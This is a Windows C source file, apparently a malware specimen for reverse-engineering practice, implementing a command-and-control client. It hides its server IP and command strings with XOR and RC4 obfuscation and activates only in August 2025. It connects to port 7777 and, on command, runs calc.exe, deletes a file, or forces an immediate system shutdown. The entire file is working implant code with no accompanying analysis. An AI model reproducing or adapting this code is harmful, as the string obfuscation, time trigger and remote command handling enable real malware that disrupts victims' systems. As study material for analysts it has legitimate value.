#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

void sub_4075F0(unsigned char* data, int data_len, const unsigned char* key, int key_len) {
    unsigned char S[256];
    int i, j = 0, k, t;
    unsigned char temp;
    for (i = 0; i < 256; i++) S[i] = i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        temp = S[i]; S[i] = S[j]; S[j] = temp;
    }
    i = j = 0;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i]; S[i] = S[j]; S[j] = temp;
        t = (S[i] + S[j]) % 256;
        data[k] ^= S[t];
    }
}

void sub_4021A0(char* data, int len) {
    unsigned char obfuscated_key[5] = {
        (0x13 ^ 0x7A),
        (0x26 ^ 0x5C),
        (0x45 ^ 0x31),
        (0x11 ^ 0x21),
        (0xAA ^ 0xFF)
    };

    unsigned char key[5];
    for (int i = 0; i < 5; i++) {
        key[i] = obfuscated_key[i] ^ (0xAA - i);
    }

    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % 5];
        data[i] = (data[i] >> 1) | (data[i] << 7); // ROR 1bit
    }
}

int sub_4031B0() {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear == 2025 && st.wMonth == 8);
}

void sub_4042C0(const char* cmd) {
    unsigned char key[] = "Augustis2Hot";
    char decoded1[16], decoded2[16], decoded3[16];
    unsigned char enc_cmd1[] = { 0x59, 0xc5, 0xae, 0x8d, 0x06, 0x8e, 0x8a, 0x2c, 0xee }; // exec_calc
    unsigned char enc_cmd2[] = { 0x58, 0xd8, 0xa7, 0x8b, 0x2d, 0x88, 0xb4, 0x2d, 0xe8 }; // delete_me
    unsigned char enc_cmd3[] = { 0x4f, 0xd5, 0xbe, 0x9a, 0x3d, 0x82, 0x9c, 0x2e };       // shutdown

    memcpy(decoded1, enc_cmd1, sizeof(enc_cmd1));
    memcpy(decoded2, enc_cmd2, sizeof(enc_cmd2));
    memcpy(decoded3, enc_cmd3, sizeof(enc_cmd3));

    sub_4075F0((unsigned char*)decoded1, sizeof(enc_cmd1), key, strlen((char*)key));
    sub_4075F0((unsigned char*)decoded2, sizeof(enc_cmd2), key, strlen((char*)key));
    sub_4075F0((unsigned char*)decoded3, sizeof(enc_cmd3), key, strlen((char*)key));

    decoded1[sizeof(enc_cmd1)] = '\0';
    decoded2[sizeof(enc_cmd2)] = '\0';
    decoded3[sizeof(enc_cmd3)] = '\0';

    if (strcmp(cmd, decoded1) == 0) system("calc.exe");
    else if (strcmp(cmd, decoded2) == 0) remove("malware.exe");
    else if (strcmp(cmd, decoded3) == 0) system("shutdown -s -t 0");
}

// C2 연결
void sub_4053D0() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    // 암호화된 IP 주소 ("192.168.100.77")
    unsigned char encoded_ip[] = {
        0xA1, 0xA1, 0xB8, 0xCB, 0x91,
        0xAF, 0xA3, 0x80, 0xF5, 0x93,
        0xA3, 0x8F, 0xB2, 0xF9, 0xF3 // null 포함
    };

    sub_4021A0((char*)encoded_ip, sizeof(encoded_ip));

    if (!sub_4031B0()) return; 

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(7777);
    server.sin_addr.s_addr = inet_addr((char*)encoded_ip);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    char buffer[128] = { 0 };
    int recv_len = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (recv_len > 0) {
        buffer[recv_len] = '\0';
        sub_4042C0(buffer);
    }

    closesocket(sock);
    WSACleanup();
}

int main() {
    sub_4053D0();
    return 0;
}